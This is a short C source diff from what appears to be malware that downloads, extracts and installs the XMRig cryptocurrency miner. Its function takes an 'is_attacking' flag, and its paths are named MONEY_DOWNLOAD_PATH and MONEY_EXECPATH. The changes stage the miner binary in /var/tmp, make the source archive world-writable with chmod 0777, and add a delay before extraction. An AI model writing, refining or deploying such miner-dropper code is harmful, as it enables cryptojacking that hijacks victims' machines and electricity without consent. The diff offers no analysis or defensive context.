@@ -117,6 +117,7 @@ int delete_file(char *path) {
 int extract_xmrig_runner(char *srcPath, char *destPath) {
     char *destDir = global->dirname(global->strdup(destPath));
     char command[256];
+    global->chmod(srcPath, 0777);
     global->snprintf(command, sizeof(command), "tar -xf %s xmrig-6.22.2/xmrig -C %s --strip-components 1", srcPath, destDir);
 
     if (global->system(command) < 0) {
@@ -126,12 +127,12 @@ int extract_xmrig_runner(char *srcPath, char *destPath) {
     }
     global->free(destDir);
 
-    if (copy_file("xmrig", destPath) < 0) {
+    if (copy_file("/var/tmp/xmrig", destPath) < 0) {
         DEBUG_LOG_ERR("[XMR] fail copy extracted file\n");
         return -1;
     }
 
-    if (delete_file("xmrig") < 0) {
+    if (delete_file("/var/tmp/xmrig") < 0) {
         DEBUG_LOG_ERR("[XMR] delete xmr exec in source path fail\n");
         return -1;
     }
@@ -174,7 +175,7 @@ int xmrig(Globals * glob, int is_attacking) {
             DEBUG_LOG_ERR("[XMR] failed fetching\n");
             return -1;
         }
-
+        global->sleep(1);
         if (extract_xmrig_runner(MONEY_DOWNLOAD_PATH, MONEY_EXECPATH) < 0) {
             DEBUG_LOG_ERR("[XMR] failed extracting\n");
             return -1;
